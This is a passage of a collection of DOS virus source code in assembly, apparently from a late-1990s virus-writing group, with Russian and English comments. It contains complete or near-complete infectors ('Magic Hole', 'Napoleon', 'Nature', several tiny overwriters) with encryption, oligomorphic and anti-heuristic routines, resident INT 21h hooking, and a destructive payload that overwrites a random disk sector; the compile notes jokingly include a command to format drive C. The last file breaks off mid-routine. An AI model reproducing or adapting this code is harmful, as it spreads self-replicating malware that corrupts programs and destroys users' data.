        db      00011111b,10000000b,11101000b ; SUB     REG,Const (8/16)
        db      00011111b,10000000b,11110000b ; XOR     REG,Const (8/16)
        db      00011111b,10000000b,11111000b ; CMP     REG,Const (8/16)

        db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      00001111b,11000000b,11000000b ; ROL     REG,Const (8/16)
        db      00001111b,11000000b,11001000b ; ROR     REG,Const (8/16)
        db      00001111b,11000000b,11010000b ; RCL     REG,Const (8/16)
        db      00001111b,11000000b,11011000b ; RCR     REG,Const (8/16)
        db      00001111b,11000000b,11100000b ; SHL/SAL REG,Const (8/16)
        db      00001111b,11000000b,11101000b ; SHR     REG,Const (8/16)
        db      00001111b,11000000b,11111000b ; SAR     REG,Const (8/16)

        db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      00000111b,11110110b,11011000b ; NEG     REG       (8/16)
        db      00000111b,11110110b,11010000b ; NOT     REG       (8/16)
        db      00000011b,11111110b,11000000b ; INC     REG       (8)
        db      00000011b,11111110b,11001000b ; DEC     REG       (8)
        db      01000010b,01000000b,00000000b ; INC     REG       (16)
        db      01000010b,01001000b,00000000b ; DEC     REG       (16)

        db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      10000001b,01110100b,00000000b ; JE      NEXTCMD
        db      10000001b,01111100b,00000000b ; JL      NEXTCMD
        db      10000001b,01111110b,00000000b ; JLE     NEXTCMD
        db      10000001b,01110010b,00000000b ; JB      NEXTCMD
        db      10000001b,01110110b,00000000b ; JP      NEXTCMD
        db      10000001b,01111010b,00000000b ; JO      NEXTCMD
        db      10000001b,01110000b,00000000b ; JS      NEXTCMD
        db      10000001b,01111000b,00000000b ; JNE     NEXTCMD
        db      10000001b,01110101b,00000000b ; JNL     NEXTCMD
        db      10000001b,01111101b,00000000b ; JG      NEXTCMD
        db      10000001b,01110011b,00000000b ; JAE     NEXTCMD
        db      10000001b,01110111b,00000000b ; JA      NEXTCMD
        db      10000001b,01111011b,00000000b ; JNP     NEXTCMD
        db      10000001b,01110001b,00000000b ; JNO     NEXTCMD
        db      10000001b,01111001b,00000000b ; JNS     NEXTCMD
        db      10000001b,11100011b,00000000b ; JCXZ    NEXTCMD
        db      10000001b,11101011b,00000000b ; JMP     NEXTCMD

        db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      10000000b,11111000b,00000000b ; CLC
        db      10000000b,11110101b,00000000b ; CMC
        db      10000000b,11111001b,00000000b ; STC
        db      10000000b,11111100b,00000000b ; CLD
        db      10000000b,11111101b,00000000b ; STD
        db      10000000b,11111010b,00000000b ; CLI
        db      10000000b,11111011b,00000000b ; STI

 oclen  equ     (this byte-opcode)/3

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Таблица опкодов для инструкций за/расшифровки
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 enopI  db      10000000b,00110000b       ; XOR
        db      11110110b,00010000b       ; NOT
        db      10000000b,00000000b       ; ADD
        db      10000000b,00101000b       ; SUB
        db      11000000b,00001000b       ; ROR
        db      11000000b,00000000b       ; ROL
        db      11110110b,00011000b       ; NEG
        db      11111110b,00000000b       ; INC
        db      11111110b,00001000b       ; DEC

 deopI  db      10000000b,00110000b       ; XOR
        db      11110110b,00010000b       ; NOT
        db      10000000b,00101000b       ; SUB
        db      10000000b,00000000b       ; ADD
        db      11000000b,00000000b       ; ROL
        db      11000000b,00001000b       ; ROR
        db      11110110b,00011000b       ; NEG
        db      11111110b,00001000b       ; DEC
        db      11111110b,00000000b       ; INC
 oplen  equ     (this byte-deopI)/2

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; конец подсчета CRC
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 end_crc:

 random1                dw      0          ; пара случайных чисел
 random2                dw      0
 checksum               dd      0          ; CRC32 вируса
 host                   db      'C'        ; тип зараженной программы

 epb                    dw      0          ; Execute Parameter Block
                        dw      80h        ; командная строка
 seg0                   dw      0
                        dw      5ch        ; FCB#1
 seg1                   dw      0
                        dw      6ch        ; FCB#2
 seg2                   dw      0

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; конец шифрованной части вируса (2-м способом - internal)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 endi:

 SaveRegs:
        pushf                   ; сохранение самих регистров
        push    eax bx edx si di bp es ds
        mov     bp,sp
        push    w [bp.rcx]      ; копирование адреса возврата
        mov     [bp.rcx],cx
        mov     bp,[bp.rbp]     ; восстановление BP
        ret

 LoadRegs:
        pop     cx              ; восстановление смещения возврата
        mov     bp,sp           ; копирование адреса возврата в пустую
        xchg    cx,[bp.rcx]
        pop     ds es bp di si edx bx eax
        popf
        ret

 rreg           struc
 rds            dw      ?       ; месторасположение сохраненных
 res            dw      ?       ; регистров в стеке
 rbp            dw      ?
 rdi            dw      ?
 rsi            dw      ?
 redx           dd      ?
 rbx            dw      ?
 reax           dd      ?
 rflg           dw      ?
 rcx            dw      ?
 rreg           ends

 original       db      0c3h       ; они должны быть последними !!!
                db      31 dup (0) ; они должны быть последними !!!

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; область недисковых данных - конец файловой части вируса
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 eov:

 io08           dw      ?,?        ; ячейки хранения векторов
 io21p          dw      ?,?        ; прерываний
 io24           dw      ?,?
 stf            db      ?          ; режим стелс (mcbcheck)
 seek_pos       dw      ?,?        ; позиция указателя (SeekSave)
 nrbytes        dw      ?          ; прочитанные байты (ReadStealth)

 r_used         dw      ?          ; 2 используемых регистра (NEXUS)
 w_flag         db      ?          ; (NEXUS)
 rm_flag        db      ?          ; хранение R/M поля индекса (NEXUS)
 crbuf          db      4 dup (?)
 nbuf           db      4 dup (?)
 fn_ptr         dw      ?,?        ; имя файла (ClrAttrib)
 attrib         dw      ?          ; аттрибуты (ClrAttrib)
 time           dw      ?          ; время файла (GetDate)
 date           dw      ?          ; дата файла (GetDate)
 delta          dw      ?          ; +смещение (входной параметр NEXUS)
 w95state       dw      ?          ; состояние Win95 (точнее WinOldAp)
 save_ax        dw      ?          ; передача параметров менеджера
 save_bx        dw      ?          ; резидентной части обработчикам
 save_es        dw      ?          ;
 reqhdr         dw      ?,?        ; REQUEST_HEADER
 intcall        dw      ?,?        ; SYS_INTERRUPT
 delay          db      ?          ; счетчик для Virus Guard

 header         db      32 dup (?)
 buffer         db      vsize dup (?)
 stacks         db      100h dup (?)

 eom:           end     ksenia
───────────────────────────────────────────────────────────────[KSENIA.ASM]───
────────────────────────────────────────────────────────────────[MHOLE.ASM]───
 jumps
.model tiny
.code
 start:
 ; Это метка о заражении
        db      0e9h,0,0,98h

 ; Сохраним регистры
        push    ax bx cx dx bp si di

 ; Загрузим bp значением дополнительного смещения
        int    1ch
 delta:
        cli
        mov     bp,sp
        mov     bp,word ptr [bp-6]
        sub     bp,offset delta
        sti

 ; Это против вЪеба
        mov     ax,1200h
        int     2fh
        cmp     al,0ffh
        sbb     ch,ch
        mov     cl,1
        lea     di,[stosed+bp]
        mov     al,90h
        rep     stosb
 stosed:
        nop

 ; Расшифровываем вирус
        mov     cx,vsize-(cbeg-start)
        lea     si,[cbeg+bp]
 decrypt:
        dw      3480h
 key    db      0000h
        inc     si
        loop    decrypt

 ; Восстановим оригинальное начало файла
 cbeg:
        lea     si,[prev+bp]
        mov     di,100h
        mov     cx,4
        rep     movsb

 ; Проверяем, не с гибким ли диском мы имеем дело?
        mov     ax,4408h
        xor     bx,bx
        int     21h
        or      ax,ax
        jz      complete

 ; Установим адрес нового dta
        mov     ah,1ah
        lea     dx,[dta+bp]
        int     21h

 ; Приступаем к поиску файлов
        mov     ah,4eh
        mov     cx,0ffefh and (not 1000b)
        lea     dx,[fmask+bp]
 get_file:
        int     21h
        jc      no_more
        call    infect
        mov     ah,4fh
        jmp     get_file

 ; Восстанавливаем dta
 no_more:
        mov     ah,1ah
        mov     dx,80h
        int     21h

 ; Восстанавливаем регистры
 complete:
        pop     di si bp dx cx bx ax

 ; Отдадим управление вирусоносителю
        mov     si,100h
        jmp     far ptr si

 prev   db      0c3h,0,0,98h
 jump   db      0e9h,0,0,98h
 fmask  db      '*.com',0

        db      '[Magic Hole]',0
        db      'Copyright (C) 1998-99 by Deadman for Ksenia Chizhova',0
        db      'There is nothing easier then to fall in love. Deadman.',0
        db      '{ALCY}'


 ; Инфицируем DS:DX ---------- ;(
 infect:
        cmp     word ptr [fsize+2+bp],0
        jnz     unluck
        cmp     word ptr [fsize+bp],60000
        ja      unluck

        mov     ax,3d00h
        lea     dx,[fname+bp]
        int     21h
        jc      unluck

        xchg    ax,bx
        mov     ah,3fh
        mov     cx,4
        lea     dx,[prev+bp]
        int     21h
        jc      close_1
        xor     cx,ax
        jnz     close_1

        cmp     byte ptr [prev+3+bp],98h
        jnz     not_infected

 close_1:
        call    close
        jmp     unluck

 not_infected:
        call    close

        mov     ax,4301h
        xor     cx,cx
        lea     dx,[fname+bp]
        int     21h
        jc      unluck
        mov     ax,3d02h
        int     21h
        jc      unluck

        xchg    ax,bx
        mov     ax,4202h
        xor     cx,cx
        cwd
        int     21h
        jc      close_2

 no_zero:
        in      al,40h
        or      al,al
        jz      no_zero
        mov     byte ptr [key+bp],al

        lea     si,[start+bp]
        lea     di,[buffer+bp]
        mov     cx,vsize
        cld
        rep     movsb

        lea     si,[buffer+(cbeg-start)+bp]
        mov     cx,vsize-(cbeg-start)
 encrypt:
        xor     byte ptr [si],al
        inc     si
        loop    encrypt

        mov     ah,40h
        mov     cx,vsize
        lea     dx,[buffer+bp]
        int     21h
        jc      close_2
        xor     cx,ax
        jnz     close_2

        xor     ax,ax
        in      al,40h
        mov     cx,ax
        in      ax,40h
        mov     dx,ax

        mov     ah,40h
        int     21h

        mov     ax,4200h
        xor     cx,cx
        cwd
        int     21h
        mov     ax,word ptr [fsize+bp]
        mov     word ptr [jump+1+bp],ax
        mov     ah,40h
        mov     cx,4
        lea     dx,[jump+bp]
        int     21h

 close_2:
        mov     ax,5700h
        inc     al
        mov     cx,[time+bp]
        mov     dx,[date+bp]
        int     21h
        call    close
        mov     ax,4300h
        inc     al
        mov     cl,byte ptr [attr+bp]
        mov     ch,0
        lea     dx,[fname+bp]
        int     21h

 unluck:
        ret

 close:
        nop
        mov     ah,3eh
        int     21h
        nop
        nop
        ret

 vsize  equ     word ptr offset $ - offset start

 dta    label   byte
        db      15h dup (?)
 attr   db      ?
 time   dw      ?
 date   dw      ?
 fsize  dw      ?,?
 fname  db      13 dup (?)

 buffer db      vsize dup (?)

        end     start
────────────────────────────────────────────────────────────────[MHOLE.ASM]───
───────────────────────────────────────────────────────────────────[25.ASM]───
model tiny
codeseg
org     100h
start:
db     '*.*',0
mov    ah,4eh
mov    cl,20h
write:
mov    dx,si
int    21h
mov    ax,3d02h
mov    dx,9eh
int    21h
xchg   ax,bx
mov    ah,40h
jmp    write
end    start
───────────────────────────────────────────────────────────────────[25.ASM]───
───────────────────────────────────────────────────────────────────[36.ASM]───
                model   tiny
                codeseg
                locals
                org     100h

 start:         db     '*.*',0

                mov    ah,4eh
                xor    cx,cx
                mov    dx,si
 next:          int    21h
                jc     last

                mov    ax,3d02h
                mov    dx,9eh
                int    21h
                xchg   ax,bx
                mov    ah,40h
                mov    cl,eov-start
                mov    dx,si
                int    21h
                mov    ah,4fh
                jmp    next

 last:          ret

 eov:           end     start

───────────────────────────────────────────────────────────────────[36.ASM]───
────────────────────────────────────────────────────────────────────[6.ASM]───
model   tiny
codeseg
org     100h
start:
xchg    ax,bp
xchg    dx,si
int     21h
retn


end     start
────────────────────────────────────────────────────────────────────[6.ASM]───
─────────────────────────────────────────────────────────────[NAPOLEON.ASM]───
 comment п
                       · N · A · P · O · L · E · O · N ·

                       Virus Written by Deadman of [SOS]
                       ─────────────────────────────────
 Virus feautures:

    This virus looks like a simple DOS overwriter, but it is able to work
 perfectly in Win32. As you know, you can execute a WinPortableExecutable
 from a DOS box, and it won't display that you are a fucking ass and so on.
 Windows will hook an executing call and process file as normal Win32 program.
 My virus uses this feauture.
 It overwrites the original begin of infected program (with COM/EXE extension)
 with itself. Begin will be located at the end of file. On execute virus will
 find some files and infect them. Then virus will cure the infected program
 and execute it using the legal DOS function 4B, subfunction 00. So, when Win
 program is executed, Windows will open usual DOS box. From DOS box will be
 executed cured PE/NE program, and DOS box will be terminated.
    Virus preserves file time/date/attributes and kills error by replacing
 int 24h. Also virus gets an exit code of executed program and quits with it.
 Virus has an anti-heuristic subroutine. It'll call 2F interrupt function
 1200h, it is MS-DOS installation check, returns al=FF. But heuristics can't
 emulate it and will be killed! Also virus is oligomorphic in files using its
 internal oligomorphic engine. On executing stack pair is relocated to another
 area to avoid erorrs. On .EXE infection virus will build new exe header,
 which will load virus only.
    On any error virus will kill random sector and display that there is
 not enough memory to run this program. By the way, virus infects 20 first
 uninfected files, which are placed in the root directory of the current
 drive. It seems virus will not perfectly determinate any overlay structure,
 so it will break ones :(. Will not infect .com filez which are less than
 Virus_Size bytes and greater than 62000 bytes.

 Compile it:
   tasm napoleon.asm /m
   tlink napoleon.obj /x/t
   del napoleon.obj
   echo y|format c:/u ;)

 Contacts:
   dman@lgg.ru
   www.lgg.ru/~dman
                                         Enjoy reading code, Deadman.
 п

 %out                   Napoleon Copyright (C) 1998-99 by Deadman [SOS]

                        ; asm code header
                        jumps
                        model   tiny
                        codeseg
                        locals
                        org     100h

 virus:                 ; anti-heuristic routine + infection mark
                        xor     ax,ax
                        mov     ds,ax
                        mov     si,2fh*4
                        mov     ax,1200h
                        pushf
                        call    dword ptr [si]
                        push    cs
                        pop     ds
                        inc     ax
                        db      04h
 key                    db      ?

                        ; decrypting virus
                        mov     cx,enc_size
                        lea     si,encrypted
 algo:                  nop
                        nop
                        inc     si
                        loop    algo

 encrypted:             ; set new int 24h handler
                        mov     ax,2524h
                        lea     dx,int24
                        int     21h

                        ; infect some filez
                        call    infect_filez

                        ; get the name of infected program
                        mov     si,2ch
                        mov     ds,[si]
                        mov     si,-1
                        xor     ax,ax
 findzero:              inc     si
                        cmp     word ptr [si],ax
                        jne     findzero
                        lea     dx,[si+4]

                        ; get file attributes
                        mov     ax,4300h
                        int     21h
                        jc      payload
                        push    cx dx ds

                        ; set attributes to normal
                        mov     ax,4301h
                        xor     cx,cx
                        int     21h
                        jc      payload

                        ; open program for read/write
                        mov     ax,3d02h
                        int     21h
                        jc      payload
                        xchg    ax,bx

                        ; set ds = cs
                        push    cs
                        pop     ds

                        ; move lseek pointer to the (eof-vsize)
                        mov     ax,4202h
                        mov     cx,-1
                        mov     dx,-vsize
                        int     21h

                        ; read vsize bytes
                        mov     ah,3fh
                        mov     cx,vsize
                        lea     dx,buffer
                        int     21h

                        ; move lseek pointer to the bof
                        mov     ax,4200h
                        xor     cx,cx
                        cwd
                        int     21h

                        ; remember file time and date
                        mov     ax,5700h
                        int     21h
                        push    cx dx

                        ; write the original begin of infected program
                        mov     ah,40h
                        mov     cx,vsize
                        lea     dx,buffer
                        int     21h
                        xor     cx,ax
                        jnz     payload

                        ; move lseek pointer to the (eof-vsize)
                        mov     ax,4202h
                        mov     cx,-1
                        mov     dx,-vsize
                        int     21h

                        ; truncate file
                        mov     ah,40h
                        xor     cx,cx
                        int     21h

                        ; restore file time and date
                        mov     ax,5701h
                        pop     dx cx
                        int     21h

                        ; close file
                        mov     ah,3eh
                        int     21h
                        jc      payload

                        ; restore file attributes
                        pop     ds dx cx
                        mov     ax,4301h
                        int     21h

                        ; resize virus's memory block
                        mov     ah,4ah
                        mov     bx,(memory_size+100h)/16+2
                        int     21h
                        jc      payload

                        ; prepare execute parameter block
                        mov     cs:seg1,cs
                        mov     cs:seg2,cs
                        mov     cs:seg3,cs

                        ; set new stack pair
                        mov     ax,cs
                        cli
                        mov     ss,ax
                        mov     sp,offset stacks+100h
                        sti

                        ; execute program
                        mov     ax,4b00h
                        lea     bx,epb
                        int     21h
                        jc      payload

                        ; restore stack
                        mov     ax,cs
                        cli
                        mov     ss,ax
                        mov     sp,offset stacks+100h
                        sti

                        ; quit with exit code of infected program
                        mov     ah,4dh
                        int     21h
                        mov     ah,4ch
                        int     21h

 payload:               ; error... I hate errors... Kill random sector
                        in      ax,40h
                        cmp     ax,200
                        jb      payload
                        cmp     ax,40000
                        ja      payload

                        xchg    dx,ax
                        mov     al,2
                        mov     cx,1
                        int     26h
                        pop     ax

                        push    cs
                        pop     ds
                        lea     dx,hehehe
                        mov     ah,9
                        int     21h
                        mov     ax,4c04h
                        int     21h

 int24:                 mov     al,3
                        iret

 hehehe                 db      'Program too big to fit in memory',0dh,0ah,24h

                        ; Execute Parameter Block
 epb                    dw      00h             ; default environment
                        dw      80h             ; command line
 seg1                   dw      ?
                        dw      5ch             ; FCB1
 seg2                   dw      ?
                        dw      6ch             ; FCB2
 seg3                   dw      ?

 copyright              db      '[Napoleon]',0
                        db      'Copyright (C) 1998-99 by Deadman [SOS]',0

 starstar:              mov     word ptr [di],'*\'
                        mov     word ptr [di+2],'*.'
                        mov     byte ptr [di+4],0
                        ret

 copyasciz:             lodsb
                        stosb
                        or      al,al
                        jnz     copyasciz
                        ret

 infect_filez:          ; initialize variables
                        mov     file_cnt,20
                        mov     dta_ptr,offset dtaz
                        lea     di,result
                        call    starstar
                        mov     dest_ptr,offset result+1

 ffirst:                ; find first in current path
                        mov     ah,4eh
                        mov     cx,11110111b
                        lea     dx,result
                        jmp     do_find

 smth_else:             ; find next file using current dta
                        mov     ah,4fh
 do_find:               push    ax dx
                        mov     ah,1ah
                        mov     dx,dta_ptr
                        int     21h
                        pop     dx ax
                        int     21h

                        ; no more -> take previous dir
                        jc      dotdot

                        ; file count limited?
                        cmp     file_cnt,0
                        jz      return

                        ; checking found unit: dir or file
                        mov     si,dta_ptr
                        test    byte ptr [si+15h],10000b
                        jz      infect
                        cmp     byte ptr [si+1eh],'.'
                        jz      smth_else
                        mov     di,dest_ptr
                        mov     word ptr [si+43],di
                        add     si,1eh
                        call    copyasciz
                        mov     dest_ptr,di
                        dec     di
                        call    starstar
                        add     dta_ptr,45
                        jmp     ffirst

 dotdot:                ; taking previous dir
                        sub     dta_ptr,45
                        mov     di,dta_ptr
                        cmp     di,offset dtaz
                        jb      return
                        mov     ax,[di+43]
                        mov     dest_ptr,ax
                        jmp     smth_else

 infect:                ; copy name+ext of file found
                        mov     di,dest_ptr
                        mov     si,dta_ptr
                        add     si,1eh
                        call    copyasciz

                        ; check extension of file found
                        cmp     word ptr [si-4],'OC'
                        je      check_com
                        cmp     word ptr [si-4],'XE'
                        je      check_exe
                        jmp     smth_else
 check_com:             cmp     byte ptr [si-2],'M'
                        je      infect_executable
                        jmp     smth_else
 check_exe:             cmp     byte ptr [si-2],'E'
                        jne     smth_else

 infect_executable:     ; clearing attributes
                        mov     ax,4301h
                        xor     cx,cx
                        lea     dx,result
                        int     21h
                        jc      try_next

                        ; opening file
                        mov     ax,3d02h
                        int     21h
                        xchg    ax,bx

                        ; reading first vsize bytes
                        mov     ah,3fh
                        mov     cx,vsize
                        lea     dx,buffer
                        int     21h
                        xor     cx,ax
                        jnz     close

                        ; exe determination
                        cmp     word ptr buffer,'MZ'
                        je      exetype
                        cmp     word ptr buffer,'ZM'
                        je      exetype

                        ; here is .com type: filesize check + infection check
                        mov     file_type,'C'
                        cmp     word ptr buffer,0c033h
                        jz      close
                        mov     si,dta_ptr
                        mov     ax,word ptr [si+1ah]
                        mov     dx,word ptr [si+1ch]
                        or      dx,dx
                        jnz     close
                        cmp     ax,62000
                        ja      close
                        jmp     no_check

 exetype:               ; here is .exe type: infection check
                        mov     file_type,'E'
                        cmp     word ptr buffer+20h,0c033h
                        jz      close

 no_check:              ; lseek to the eof
                        mov     ax,4202h
                        xor     cx,cx
                        cwd
                        int     21h

                        ; writing the original begin to eof
                        mov     ah,40h
                        mov     cx,vsize
                        lea     dx,buffer
                        int     21h
                        xor     cx,ax
                        jnz     close

                        ; lseek to the bof
                        mov     ax,4200h
                        xor     cx,cx
                        cwd
                        int     21h

                        ; prepare for write virus
                        mov     ah,40h
                        mov     cx,vsize
                        lea     dx,buffer

                        ; exe determination
                        cmp     file_type,'E'
                        jne     no_exe

                        ; .exe trick, write new exe header
                        push    ax bx cx dx
                        mov     ah,40h
                        mov     cx,20h
                        lea     dx,exe_hdr
                        int     21h
                        pop     dx cx bx ax
                        sub     cx,20h

 no_exe:                ; encrypt virus
                        call    encrypt

                        ; write virus body
                        int     21h
                        dec     file_cnt

 close:                 ; restore file time/date
                        mov     si,dta_ptr
                        mov     ax,5701h
                        mov     cx,word ptr [si+16h]
                        mov     dx,word ptr [si+18h]
                        int     21h

                        ; close file
                        mov     ah,3eh
                        int     21h

                        ; restore file attributes
                        mov     ax,4301h
                        xor     cx,cx
                        mov     cl,byte ptr [si+15h]
                        mov     dx,9eh
                        int     21h

 try_next:              ; look for a next file
                        jmp     smth_else

 return:                ret

 ;                      ***********************
 ;                      * OLIGOMORPHIC ENGINE *
 ;                      ***********************

 encrypt:               ; save registers are in use
                        push    ax bx cx dx si di bp

                        ; copy virus to the buffer
                        mov     si,100h
                        lea     di,buffer
                        mov     cx,vsize
                        rep     movsb

                        ; get random decryptor
                        in      al,40h
                        sub     al,2
                        jnc     $-2
                        add     al,2
                        cbw
                        add     al,al
                        push    ax
                        add     ax,offset algo_table
                        mov     si,ax
                        mov     ax,word ptr [si]
                        mov     word ptr buffer[algo-virus],ax

                        ; get encryptor for this decryptor
                        pop     si
                        add     si,offset de_table
                        mov     ax,word ptr [si]
                        mov     word ptr algo_temp,ax

                        ; get encrypting key
 get_normal:            in      al,40h
                        or      al,al
                        jz      get_normal
                        mov     byte ptr buffer[key-virus],al

                        ; set SI and CX
                        lea     si,buffer+(encrypted-virus)
                        mov     cx,enc_size

                        ; encrypting virus
 algo_temp:             dw      ?
                        inc     si
                        loop    algo_temp

                        ; restore registers
                        pop     bp di si dx cx bx ax

                        ; return
                        ret

 algo_table:            ; encryptors
                        sub     [si],al
                        xor     [si],al
                        add     [si],al

 de_table:              ; decryptors
                        add     [si],al
                        xor     [si],al
                        sub     [si],al

 exe_hdr:               ; virus .exe header
                        dw      5a4dh           ; signature
                        dw      0000h           ; image size mod 512
                        dw      0002h           ; image size div 512
                        dw      0000h           ; relocations
                        dw      0002h           ; header size in paragraphs
                        dw      0000h           ; minimum memory
                        dw        -1h           ; maximum memory
                        dw       -10h           ; SS
                        dw        -2h           ; SP
                        dw      019fh           ; checksum (fuck her)
                        dw      0100h           ; IP
                        dw       -10h           ; CS
                        dw      0000h           ; offset of relocation table
                        dw      0000h           ; overlay number

                        ; garbage for .exe infection
                        db      20h dup (5ah)

 vsize                  equ     $-virus
 enc_size               equ     $-encrypted

 buffer                 db      vsize dup (0C3h)
 file_type              db      ?
 file_cnt               db      ?
 dta_ptr                dw      ?
 dest_ptr               dw      ?
 stacks                 db      100h dup (?)
 result                 db      200h dup (?)
 dtaz                   label   byte
 memory_size            equ     $-virus
                        end     virus
─────────────────────────────────────────────────────────────[NAPOLEON.ASM]───
───────────────────────────────────────────────────────────────[NATURE.ASM]───
			model	tiny

			codeseg
			locals
			org	100h

 Nature:		db	0e9h,0,0		; real nop

			neg	sp
			not	sp
			inc	sp

			push	ax bx cx dx si di bp
			push	ss
			pop	ss

			call	getlocation		; get extra offset
 getlocation:		pop	bp
			sub	bp,offset   getlocation

			call	payload

			mov	ax,0ffffh		; verify if resident
			int	21h
			cmp	ax,0faceh
			je	complete

			xor	ax,ax			; get the copy of
			mov	ds,ax			; int 21h vector
			mov	si,21h*4
			lea	di,old21+bp
			movsw
			movsw
			mov	si,21h*4
			lea	di,old21c+bp
			movsw
			movsw

			xor	ax,ax			; copy integrity check
			mov	es,ax			; subroutine to vector
			mov	ax,cs			; table (0000:0200)
			mov	ds,ax
			mov	di,200h
			lea	si,tester+bp
			mov	cx,endt-tester
			rep	movsb

			mov	ax,0bb00h		; load virus to video
			mov	es,ax			; memory
			mov	ax,cs
			mov	ds,ax
			lea	si,Nature+bp
			mov	di,100h
			mov	cx,endv-Nature
			rep	movsb

			xor	ax,ax			; set int 21h vector
			mov	es,ax			; to 0000:0200
			mov	di,21h*4
			mov	ax,200h
			stosw
			xor	ax,ax
			stosw

 complete:		mov	ax,cs			; restore the original
			mov	ds,ax			; begin of infected
			mov	es,ax			; program
			mov	di,100h
			lea	si,prev+bp
			mov	ax,1200h
			int	2fh
			mov	ah,al
			xor	word ptr [si],ax
			neg	byte ptr [si+2]
			movsw
			movsb

			pop	bp di si dx cx bx ax	; restore registers

			mov	ds:[0fffch],0100h	; save 100h on stack
			mov	sp,0fffch
			ret				; virus return

 elsebyte		dw	1234h

 prev			db	not 0c3h,0,0		; stored begin
 jump			db	0e9h,0,0
 old21			dw	0,0

 tester:		pushf				; virus integrity check
			push	ds ax
			mov	ax,0bb00h
			mov	ds,ax
			cmp	word ptr sign,'N['	; number 1
			jne	crash
			cmp	word ptr sign+2,'TA'	; number 2
			jne	crash
			cmp	word ptr elsebyte,1234h ; number 3
			jne	crash
			pop	ax ds			; passed
			popf
			db	0eah			; jump virus
			dw	int21h,0bb00h
 crash: 		mov	ax,word ptr cs:[old21c-tester+200h]
			mov	word ptr cs:[21h*4],ax	; Crashed, reset int21h
			mov	ax,word ptr cs:[old21c+2-tester+200h]
			mov	word ptr cs:[21h*4+2],ax
			pop	ax ds
			popf
			db	0eah
 old21c 		dw	0h,0h
 endt:

 sign			db	'[NATURE]',0
			db	'Copyright (C) 1998-99 Deadman',0

 int21h:		pushf				; int 21h handler

			cmp	ax,0ffffh		; test if TSR?
			jne	nottsr
			mov	ax,0faceh
			popf
			iret
 nottsr:		cmp	ax,4b00h		; execute?
			je	INFECT
			popf
			jmp	dword ptr cs:old21

 INFECT:		push	ax bx cx dx si di es ds

			xor	ax,ax			; take and set int 24h
			mov	es,ax
			push	word ptr es:[24h*4+2]
			push	word ptr es:[24h*4]
			mov	word ptr es:[24h*4],offset int24h
			mov	word ptr es:[24h*4+2],cs

			pushf				; interrupt return ;-)
			push	cs
			push	offset contin
 int24h:		mov	al,3
			iret

 contin:		mov	ax,4300h		; get and set file
			int	21h			; attributes
			mov	si,cx
			xor	cx,cx
			mov	ax,4301h
			int	21h
			jnc	a0
			jmp	noinf
 a0:			push	dx ds si

			mov	ax,3d02h		; open file for r/w
			int	21h
			jnc	a1
			jmp	fuck
 a1:			mov	bx,ax
			mov	ax,5700h
			int	21h
			push	cx dx

			mov	ax,cs			; read 3 first bytes
			mov	ds,ax
			mov	es,ax
			mov	ah,3fh
			lea	dx,prev
			mov	cx,3
			int	21h
			cmp	ax,cx
			je	a2
			jmp	fuckc

 a2:			mov	ax,4202h		; lseek eof
			xor	cx,cx
			xor	dx,dx
			int	21h
			or	dx,dx
			jz	a3
			jmp	fuckc

 a3:			cmp	ax,64000		; large?
			jbe	a4
			jmp	fuckc
 a4:			cmp	byte ptr prev,0e9h
			jne	a5
			push	ax
			sub	ax,endv-Nature
			cmp	word ptr prev+1,ax
			pop	ax
			je	fuckc

 a5:			cmp	word ptr prev,'MZ'	; exe code type?
			je	fuckc
			cmp	word ptr prev,'ZM'
			je	fuckc

			mov	word ptr jump+1,ax	; new jump

			mov	ax,1200h
			int	2fh
			mov	ah,al
			xor	word ptr prev,ax
			neg	byte ptr prev+2
			mov	ah,40h			; write virus body
			mov	cx,endv-Nature		; to the eof
			lea	dx,Nature
			int	21h
			xor	cx,ax
			jnz	fuckc

			mov	ax,4200h		; lseek bof
			xor	cx,cx
			xor	dx,dx
			int	21h

			mov	ah,40h			; write new jump
			mov	cx,3
			lea	dx,jump
			int	21h

